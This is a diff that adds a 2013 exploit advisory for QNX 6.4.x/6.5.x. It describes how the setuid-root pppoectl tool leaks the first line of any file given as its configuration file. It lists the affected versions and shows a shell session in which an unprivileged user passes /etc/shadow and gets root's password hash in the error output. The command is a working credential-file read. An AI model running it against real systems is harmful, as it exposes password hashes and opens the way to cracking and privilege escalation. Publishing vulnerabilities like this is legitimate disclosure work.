@@ -1,0 +1,26 @@
+#
+#          QNX 6.4.x/6.5.x pppoectl disclose /etc/shadow by cenobyte 2013
+#                         <vincitamorpatriae@gmail.com>
+#
+# - vulnerability description:
+# QNX setuid root /sbin/pppoectl allows any user to gain access to privileged
+# information such as the root password hash.
+#
+# The vulnerability exists because of a failure to drop privileges or check the
+# permissions and ownership on the file specified as the configuration file.
+#
+# If a user specifies a file such as /etc/shadow, pppoectl will display the
+# first line of the shadow file in the error output.
+#
+# - vulnerable platforms:
+# QNX 6.5.0SP1
+# QNX 6.5.0
+# QNX 6.4.1
+
+$ id
+uid=100(user) gid=100
+
+$ ls -la /etc/shadow
+-rw-------  1 root      root             69 Oct 10 16:55 /etc/shadow
+$ pppoectl -f /etc/shadow lo0
+pppoectl: bad parameter: "root:QSkSGrRQOSLoO:1380296317:0:0"
